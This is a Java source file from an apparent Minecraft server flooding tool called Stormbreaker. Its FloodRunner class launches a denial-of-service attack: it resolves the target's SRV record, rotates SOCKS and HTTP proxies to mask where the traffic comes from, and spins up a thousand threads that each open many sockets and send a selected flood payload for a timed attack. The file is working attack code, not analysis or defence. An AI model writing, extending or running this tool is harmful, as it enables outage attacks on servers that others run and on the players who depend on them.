package com.gabrielhd.Stormbreaker.flood;

import com.gabrielhd.Stormbreaker.helper.SRVResolver;
import com.gabrielhd.Stormbreaker.network.SocketHttp;
import com.gabrielhd.Stormbreaker.option.Options;
import com.gabrielhd.Stormbreaker.proxy.Proxies;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FloodRunner
{
    private final Options options;
    private final Proxies proxies;
    private int connections;
    private int failed;
    private int timed;
    private int maxConnections;
    private final Flooders flooders;
    
    public FloodRunner(Options options, Proxies proxies) {
        this.connections = 0;
        this.failed = 0;
        this.timed = 0;
        this.maxConnections = -1;
        this.flooders = new Flooders();
        this.options = options;
        this.proxies = proxies;
    }

    public void run() {
        Flooders.Flooder flooder;
        String host = this.options.getOption("host", "127.0.0.1");
        int port = this.options.getOption("port", 25565);
        boolean srvResolve = this.options.getOption("srvResolve", true);
        boolean alwaysResolve = this.options.getOption("alwaysResolve", false);
        int threads = this.options.getOption("threads", 1000);
        int connections = this.options.getOption("connections", 1000);
        int attackTime = this.options.getOption("attackTime", 30);
        boolean srvResolve2 = this.options.getOption("srvResolve2", false);
        int timeout = this.options.getOption("timeout", 0);
        boolean keepAlive = this.options.getOption("keepAlive", true);
        String floodName = String.valueOf(this.options.getOption("exploit", "1"));
        boolean removeFailure = this.options.getOption("removeFailure", false);
        Flooders.LOOP_AMOUNT = this.options.getOption("loopAmount", 1500);
        boolean print = this.options.getOption("print", false);
        boolean socksV4 = this.options.getOption("socksV4", true);
        if (srvResolve && alwaysResolve) {
            System.out.println("ServerResolver and AlwaysResolve options are enabled at the same time, are you sure it's fine?");
        }
        if (srvResolve) {
            String resolvedIp = SRVResolver.srv(host);
            String[] resolvedSplit = resolvedIp.split(":");
            host = resolvedSplit[0];
            port = Integer.parseInt(resolvedSplit[1]);
        }
        if ((flooder = this.flooders.findById(String.valueOf(floodName))) == null) {
            System.out.println("Flooder with name " + floodName + " doesnt exist! List of floods: " + this.flooders.getFlooders().toString());
            System.exit(1);
            return;
        }
        if (srvResolve2) {
            try {
                String latest = "unkown";
                for (InetAddress resolved : InetAddress.getAllByName(host)) {
                    try {
                        Socket socket = new Socket();
                        latest = resolved.getHostAddress();
                        socket.connect(new InetSocketAddress(latest, port), 1000);
                        socket.getOutputStream().write(0);
                    }
                    catch (Exception ex) {
                        System.out.println("[SrvResolve2] Found ip, " + resolved.getHostAddress() + ", but couldn't connect = (");
                        continue;
                    }
                    System.out.println("[SrvResolve2] Found ip! " + resolved.getHostAddress());
                }
                host = latest;
                System.out.println("[SrvResolve2] Resolved ip! Using: " + host);
            }
            catch (Exception ex) {
                System.out.println("[SrvResolve2] Couldn't resolve ip! " + ex.getMessage());
            }
        }
        new Timer().scheduleAtFixedRate(new TimerTask(){

            @Override
            public void run() {
                System.out.println("Successfully connected sockets: \u001b[32m" + FloodRunner.this.connections + "\u001b[0m" + "/" + FloodRunner.this.maxConnections + "\nFailed: " + FloodRunner.this.failed + ", timed: " + "\u001b[31m" + FloodRunner.this.timed + "\u001b[0m" + ", proxies: " + FloodRunner.this.proxies.size());
            }
        }, 8000L, 8000L);
        new Thread(() -> {
            try {
                Thread.sleep(1000L * (long)attackTime);
            }
            catch (Exception exception) {
                // empty catch block
            }
            System.out.println("Attack finished.");
            System.exit(-1);
        }).start();
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        System.out.println("Started attack! " + host + ":" + port + ", method: " + "\u001b[34m" + floodName + "\u001b[0m" + "," + " threads: " + threads + ", time attack: " + attackTime);
        this.maxConnections = threads * connections;
        String finalServerName = host;
        int finalPort = port;
        for (int j = 0; j < threads; ++j) {
            executorService.submit(() -> {
                try {
                    String newServerName;
                    int newServerPort;
                    if (alwaysResolve) {
                        String resolvedIp = SRVResolver.srv(finalServerName);
                        String[] resolvedSplit = resolvedIp.split(":");
                        newServerName = resolvedSplit[0];
                        newServerPort = Integer.parseInt(resolvedSplit[1]);
                    } else {
                        newServerName = finalServerName;
                        newServerPort = finalPort;
                    }
                    Proxy lastProxy = null;
                    for (int i = 0; i < connections; ++i) {
                        try {
                            Socket socket;
                            Proxy proxy = lastProxy = this.proxies.nextProxy();
                            Socket socket2 = socket = proxy.type() == Proxy.Type.HTTP ? new SocketHttp(newServerName, newServerPort, proxy.address(), timeout) : new Socket(proxy);
                            if (!(socket instanceof SocketHttp)) {
                                if (socksV4) {
                                    try {
                                        Method m = socket.getClass().getDeclaredMethod("getImpl");
                                        m.setAccessible(true);
                                        Object sd = m.invoke(socket);
                                        m = sd.getClass().getDeclaredMethod("setV4");
                                        m.setAccessible(true);
                                        m.invoke(sd);
                                    }
                                    catch (Exception m) {
                                        // empty catch block
                                    }
                                }
                                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
                            }
                            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                            flooder.flood(out, newServerName, newServerPort);
                            out.flush();
                            ++this.connections;
                            if (print) {
                                System.out.println("CONNECTED \u001b[31m" + newServerName + ":" + newServerPort + "\u001b[0m" + " | " + "\u001b[36m" + proxy.address().toString() + "\u001b[0m" + " x" + this.connections);
                            }
                            if (keepAlive) continue;
                            socket.close();
                            continue;
                        }
                        catch (Exception ex) {
                            ++this.failed;
                            if (!ex.getMessage().contains("reply")) continue;
                            ++this.timed;
                            if (!removeFailure) continue;
                            this.proxies.removeProxy(lastProxy);
                        }
                    }
                }
                catch (Exception newServerName) {
                    // empty catch block
                }
            });
        }
    }
}
